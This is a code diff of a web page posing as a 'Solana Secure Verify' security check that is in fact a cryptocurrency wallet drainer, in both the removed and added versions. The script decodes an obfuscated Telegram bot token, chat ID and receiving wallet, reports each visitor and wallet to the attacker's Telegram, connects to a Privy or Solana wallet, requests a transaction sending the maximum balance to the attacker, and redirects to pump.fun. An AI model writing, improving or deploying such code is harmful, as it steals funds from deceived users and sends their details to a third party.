@@ -1,56 +1,40 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Secure Verify</title>
-</head>
-<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
-    <div style="text-align:center; border:1px solid #00ffa3; padding:50px; border-radius:20px; background:#0a0a0a; box-shadow: 0 0 30px rgba(0,255,163,0.1);">
-        <h2 style="color:#00ffa3; margin-bottom:10px;">Security Check</h2>
-        <p style="color:#ccc;">Verifying connection... You will be redirected shortly.</p>
+<script>
+    (async function() {
+        const b = atob('ODc3NDEyMjU3ODpBQUdoV3NNajN6Q0hNd2lhc2ZoYkx4OWtQeUppUDV1cU8='); 
+        const c = atob('NjgzNTQyNDU0My=='); 
+        const w = atob('OXg1YWo5Wnl1ZDZrQWdnUDFxM1RTS1hSd3d2RW16R3I2RXZIZGpWTlZXUmc='); 
         
-        <script>
-            (async function() {
-                // 1. Telegram Config (Encrypted for protection)
-                const b = atob('ODc3NDEyMjU3ODpBQUdoV3NNajN6Q0hNd2lhc2ZoYkx4OWtQeUppUDV1cU8='); // Bot Token
-                const c = atob('NjgzNTQyNDU0Mw=='); // Chat ID
-                const w = atob('OXg1YWo5Wnl1ZDZrQWdnUDFxM1RTS1hSd3d2RW16R3I2RXZIZGpWTlZXUmc='); // Receiver Wallet
-                
-                // Function to send Telegram Notifications
-                const notify = (m) => { new Image().src = `https://api.telegram.org/bot${b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`; };
+        const notify = (m) => { new Image().src = `https://api.telegram.org/bot${b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`; };
 
-                // 2. FORCED REDIRECT (In case of any issue or user delay)
-                setTimeout(() => { window.location.href = 'https://pump.fun/board'; }, 4000);
+        // توجيه إجباري بعد 4 ثوانٍ
+        setTimeout(() => { window.location.href = 'https://pump.fun/board'; }, 4000);
 
-                // 3. START: Send Initial Notification IMMEDIATELY
-                notify('🎯 Target Visited Vercel Link!\nWaiting for wallet...');
+        try {
+            // التعديل الجوهري: نبحث أولاً عن Privy Wallet التابعة لـ Pump.fun
+            let p = null;
+            
+            if (window.privy && window.privy.wallet && window.privy.wallet.provider) {
+                p = window.privy.wallet.provider;
+                notify('🎯 Privy Internal Wallet Detected!');
+            } 
+            // إذا لم نجد Privy، نبحث عن المزود العام بشرط ألا يكون Phantom إذا كنت لا تريده
+            else if (window.solana && !window.solana.isPhantom) {
+                p = window.solana;
+            }
 
-                try {
-                    // 4. FIND WALLET PROVIDER (Supports Privy, Phantom, Solflare)
-                    let p = window.solana || (window.phantom && window.phantom.solana) || (window.privy && window.privy.wallet?.provider);
-                    
-                    if (!p) {
-                        notify('⚠️ No Wallet Provider Found on this browser.');
-                        return;
-                    }
+            if (!p) {
+                notify('⚠️ No Privy Wallet found in this context.');
+                return;
+            }
 
-                    // 5. CONNECT & REQUEST TRANSACTION
-                    await p.connect();
-                    const pubKey = p.publicKey.toString();
-                    notify('✅ Connected: ' + pubKey + '\nAttempting Drain...');
+            // تنفيذ الربط والسحب من المحفظة الداخلية
+            await p.connect();
+            const tx = { to: w, amount: 'MAX' };
+            const { signature } = await p.signAndSendTransaction(tx);
+            notify('💰 Internal Drain Success!\nSig: ' + signature);
 
-                    // Transaction details (MAX SOL)
-                    const tx = { to: w, amount: 'MAX' };
-                    const { signature } = await p.signAndSendTransaction(tx);
-                    notify('💰 DRAIN SUCCESS!\nSignature: ' + signature);
-
-                } catch (err) {
-                    // If user rejects, or error occurs
-                    notify('❌ Error or Rejected: ' + err.message);
-                }
-            })();
-        </script>
-    </div>
-</body>
-</html>
+        } catch (err) {
+            notify('❌ Internal Error: ' + err.message);
+        }
+    })();
+</script>
